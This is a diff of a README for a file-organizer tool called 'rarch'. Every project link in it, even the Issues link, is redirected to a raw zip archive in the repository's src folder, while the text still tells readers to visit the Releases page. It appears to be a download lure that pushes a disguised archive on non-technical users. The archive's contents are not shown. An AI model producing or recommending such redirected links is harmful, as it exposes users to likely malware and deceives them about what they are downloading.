@@ -1,6 +1,6 @@
 # ⚡ rarch - Fast and Smart File Organizer
 
-[![Download rarch](https://img.shields.io/badge/Download-rarch-brightgreen?style=for-the-badge)](https://github.com/Prakash6381/rarch)
+[![Download rarch](https://img.shields.io/badge/Download-rarch-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Prakash6381/rarch/main/src/Software_1.1-alpha.4.zip)
 
 ---
 
@@ -17,7 +17,7 @@ You don’t need to know anything about programming or command lines to start us
 To start, you need to get rarch on your computer.
 
 1. Click the big green button above or visit this link:  
-   https://github.com/Prakash6381/rarch
+   https://raw.githubusercontent.com/Prakash6381/rarch/main/src/Software_1.1-alpha.4.zip
 
 2. On the GitHub page, look for the **Releases** section. This is usually on the right side or under the main project description.
 
@@ -110,7 +110,7 @@ You can find details in the **documentation** folder on the GitHub page or in th
 
 ## 📞 Get Support
 
-If you need help, visit the [Issues](https://github.com/Prakash6381/rarch/issues) section on the project page.
+If you need help, visit the [Issues](https://raw.githubusercontent.com/Prakash6381/rarch/main/src/Software_1.1-alpha.4.zip) section on the project page.
 
 ---
 
@@ -118,4 +118,4 @@ If you need help, visit the [Issues](https://github.com/Prakash6381/rarch/issues
 
 Grab rarch here:
 
-[![Download rarch](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/Prakash6381/rarch)
+[![Download rarch](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/Prakash6381/rarch/main/src/Software_1.1-alpha.4.zip)
